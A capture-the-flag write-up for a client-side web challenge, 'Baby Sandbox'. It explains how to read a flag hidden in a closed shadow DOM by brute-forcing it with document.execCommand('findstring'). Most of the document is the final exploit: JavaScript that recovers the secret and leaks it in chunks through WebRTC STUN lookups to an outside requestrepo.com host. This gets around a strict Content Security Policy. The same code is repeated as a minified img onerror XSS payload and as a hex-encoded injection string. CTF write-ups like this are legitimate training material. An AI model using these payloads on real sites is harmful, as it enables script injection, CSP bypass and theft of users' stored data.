# Baby Sandbox

This is an easy client-side challenge

## Overview

We're given a few files
 - `server.js`: Contains the server code. We can see that the server serves files with a strict CSP:
```js
app.use((req, res, next) => {
    res.setHeader("Content-Security-Policy", "default-src 'none'; frame-ancestors 'none'; base-uri 'none'; form-action 'none'; script-src 'self' 'unsafe-inline';");
    next()
})
```

 - `iframe.ejs`: A simple HTML file with an obvious HTML injection:
```js
      let d = document.createElement("div");
      d.innerHTML = "<%= payload %>";
      document.body.appendChild(d);
```
 - `index.ejs`: The content of `index.ejs` will be put inside an iframe 

 - `bot.js`: Contains the bot code. It's clear that the flag will be stored in local storage. We can supply a payload to the `visit` function, which will then be viewed by the bot. Note that the bot will sleep for a short period after viewing our payload.

Finally, before inserting our payload, the flag will be placed inside a closed [shadow DOM](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_shadow_DOM), making it inaccessible from JavaScript.

To bypass this restriction, we can use a deprecated feature: [document.execCommand](https://developer.mozilla.org/en-US/docs/Web/API/Document/execCommand)

Specifically, we can use a lesser-known command: `findstring`:
 - `document.execCommand("findstring", false, <substring>)`, returns true if the substring is found, and false otherwise. I found it [here](https://chromium.googlesource.com/chromium/src/+/refs/tags/131.0.6778.244/third_party/blink/renderer/core/editing/commands/editor_command_names.h)


After brute-forcing the flag, we can split it into chunks and exfiltrate it using WebRTC or any other method that does not violate the CSP. 

Note: since our payload will be escaped, we had to encode it using the following function
```js
def encode(payload):
    result = ""
    for c in payload:
        result += "\\x" + hex(ord(c))[2:].zfill(2)
    return result
```

## Final Exploit
```js
(() => {
    function toHex(str) {
        let hex = '';
        for(let i = 0; i < str.length; i++) {
            hex += str.charCodeAt(i).toString(16);
        }
        return hex;
    }
    
    let flag = "TRX{";
    let charset = "abcdefghijklmnopqrstuvwxyz0123456789_{}";
    for(let i = 0; i < 128; i++){
        for(let c in charset){
            res = document.execCommand("findstring", false, flag+charset[c]);
            if(res){
                flag += charset[c];
                break;
            }
        }
    }
    
    let chunkSize = 4;
    for (let i = 0; i < flag.length; i += chunkSize) {
        let chunk = flag.substring(i, i + chunkSize);
        console.log(chunk);
        let pc = new RTCPeerConnection({"iceServers":[{"urls":["stun:" + toHex(chunk) + "." + i + ".az5f3of1.requestrepo.com"]}]});
        pc.createOffer({offerToReceiveAudio:1}).then(o => pc.setLocalDescription(o)).catch(e => console.error(e));
    }
    })();
```

You can then compress this and put it inside an `img` tag:
```html
<img src="#" onerror='(()=>{let o="TRX{";var r="abcdefghijklmnopqrstuvwxyz0123456789_{}";for(let e=0;e<128;e++)for(var t in r)res=document.execCommand("findstring",!1,o+r[t]),res&&(o+=r[t]);for(let e=0;e<o.length;e+=4){var n=o.substring(e,e+4);console.log(n);let r=new RTCPeerConnection({iceServers:[{urls:["stun:"+function(r){let o="";for(let e=0;e<r.length;e++)o+=r.charCodeAt(e).toString(16);return o}(n)+"."+e+".az5f3of1.requestrepo.com"]}]});r.createOffer({offerToReceiveAudio:1}).then(e=>r.setLocalDescription(e)).catch(e=>console.error(e))}})();'>
```

Encoded payload:
```js
\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x22\x23\x22\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x27\x28\x28\x29\x3d\x3e\x7b\x6c\x65\x74\x20\x6f\x3d\x22\x54\x52\x58\x7b\x22\x3b\x76\x61\x72\x20\x72\x3d\x22\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x5f\x7b\x7d\x22\x3b\x66\x6f\x72\x28\x6c\x65\x74\x20\x65\x3d\x30\x3b\x65\x3c\x31\x32\x38\x3b\x65\x2b\x2b\x29\x66\x6f\x72\x28\x76\x61\x72\x20\x74\x20\x69\x6e\x20\x72\x29\x72\x65\x73\x3d\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x65\x78\x65\x63\x43\x6f\x6d\x6d\x61\x6e\x64\x28\x22\x66\x69\x6e\x64\x73\x74\x72\x69\x6e\x67\x22\x2c\x21\x31\x2c\x6f\x2b\x72\x5b\x74\x5d\x29\x2c\x72\x65\x73\x26\x26\x28\x6f\x2b\x3d\x72\x5b\x74\x5d\x29\x3b\x66\x6f\x72\x28\x6c\x65\x74\x20\x65\x3d\x30\x3b\x65\x3c\x6f\x2e\x6c\x65\x6e\x67\x74\x68\x3b\x65\x2b\x3d\x34\x29\x7b\x76\x61\x72\x20\x6e\x3d\x6f\x2e\x73\x75\x62\x73\x74\x72\x69\x6e\x67\x28\x65\x2c\x65\x2b\x34\x29\x3b\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x6c\x6f\x67\x28\x6e\x29\x3b\x6c\x65\x74\x20\x72\x3d\x6e\x65\x77\x20\x52\x54\x43\x50\x65\x65\x72\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x28\x7b\x69\x63\x65\x53\x65\x72\x76\x65\x72\x73\x3a\x5b\x7b\x75\x72\x6c\x73\x3a\x5b\x22\x73\x74\x75\x6e\x3a\x22\x2b\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x72\x29\x7b\x6c\x65\x74\x20\x6f\x3d\x22\x22\x3b\x66\x6f\x72\x28\x6c\x65\x74\x20\x65\x3d\x30\x3b\x65\x3c\x72\x2e\x6c\x65\x6e\x67\x74\x68\x3b\x65\x2b\x2b\x29\x6f\x2b\x3d\x72\x2e\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74\x28\x65\x29\x2e\x74\x6f\x53\x74\x72\x69\x6e\x67\x28\x31\x36\x29\x3b\x72\x65\x74\x75\x72\x6e\x20\x6f\x7d\x28\x6e\x29\x2b\x22\x2e\x22\x2b\x65\x2b\x22\x2e\x61\x7a\x35\x66\x33\x6f\x66\x31\x2e\x72\x65\x71\x75\x65\x73\x74\x72\x65\x70\x6f\x2e\x63\x6f\x6d\x22\x5d\x7d\x5d\x7d\x29\x3b\x72\x2e\x63\x72\x65\x61\x74\x65\x4f\x66\x66\x65\x72\x28\x7b\x6f\x66\x66\x65\x72\x54\x6f\x52\x65\x63\x65\x69\x76\x65\x41\x75\x64\x69\x6f\x3a\x31\x7d\x29\x2e\x74\x68\x65\x6e\x28\x65\x3d\x3e\x72\x2e\x73\x65\x74\x4c\x6f\x63\x61\x6c\x44\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e\x28\x65\x29\x29\x2e\x63\x61\x74\x63\x68\x28\x65\x3d\x3e\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x65\x72\x72\x6f\x72\x28\x65\x29\x29\x7d\x7d\x29\x28\x29\x3b\x27\x3e
```
